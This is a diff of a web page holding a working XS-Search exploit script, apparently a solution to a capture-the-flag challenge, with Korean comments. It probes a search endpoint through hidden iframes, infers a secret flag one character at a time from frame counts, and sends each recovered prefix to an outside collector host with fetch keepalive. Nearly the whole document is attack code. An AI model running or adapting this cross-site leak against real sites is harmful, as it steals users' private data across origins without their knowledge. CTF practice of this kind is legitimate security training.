@@ -8,44 +8,53 @@
 <body>
     <h1>XS-Search Site</h1>
 
-<iframe id="iframe" style="display:none;"></iframe>
 <script>
-    const iframe = document.getElementById("iframe");
-    const chars = "abcdefghijklmnopqrstuvwxyz0123456789}";
-    let flag = "DH{22d1445ad";
+    const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+    let flag = "DH{22d1445ad68e1"; // 마지막으로 찾은 부분부터 시작
 
     async function searchChar(data) {
         return new Promise((resolve) => {
-            iframe.onload = () => {
-                resolve(iframe.contentWindow.frames.length > 0);
+            const ifr = document.createElement('iframe');
+            ifr.style.display = 'none';
+            
+            // 봇이 죽기 전에 강제 해제 (250ms 응답 없으면 바로 다음 글자로)
+            const timer = setTimeout(() => {
+                if(document.body.contains(ifr)) document.body.removeChild(ifr);
+                resolve(false);
+            }, 250);
+
+            ifr.onload = () => {
+                clearTimeout(timer);
+                const found = ifr.contentWindow.frames.length > 0;
+                document.body.removeChild(ifr);
+                resolve(found);
             };
-            iframe.src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(data);
-        })
+            
+            ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(data)}`;
+            document.body.appendChild(ifr);
+        });
     }
 
     async function findFlag() {
-        // 접속 확인 신호
-        new Image().src = "https://krxnknf.request.dreamhack.games?start=started";
+        // fetch keepalive를 사용하면 봇이 종료되어도 요청이 끝까지 전달됩니다.
+        const report = (f) => fetch(`https://krxnknf.request.dreamhack.games?found=${encodeURIComponent(f)}`, {keepalive: true, mode: 'no-cors'});
+        
+        report('started');
 
-        while (flag.length <= 40) {
-            let found = false;
-            for (let i = 0; i < chars.length; i++) {
-                if (await searchChar(flag + chars[i])) {
-                    flag += chars[i];
-                    new Image().src = "https://krxnknf.request.dreamhack.games?found=" + encodeURIComponent(flag);
-                    found = true;
-
-                    if (chars[i] === "}") return;
+        for (let i = 0; i < 30; i++) {
+            let foundAny = false;
+            for (let c of chars) {
+                if (await searchChar(flag + c)) {
+                    flag += c;
+                    report(flag); // 찾자마자 즉시 전송
+                    foundAny = true;
+                    if (c === "}") return;
                     break;
                 }
             }
-            if (!found) {
-                new Image().src = "https://krxnknf.request.dreamhack.games?error=notfound";
-                break;
-            }
+            if (!foundAny) break;
         }
     }
-
     findFlag();
 </script>
 </body>
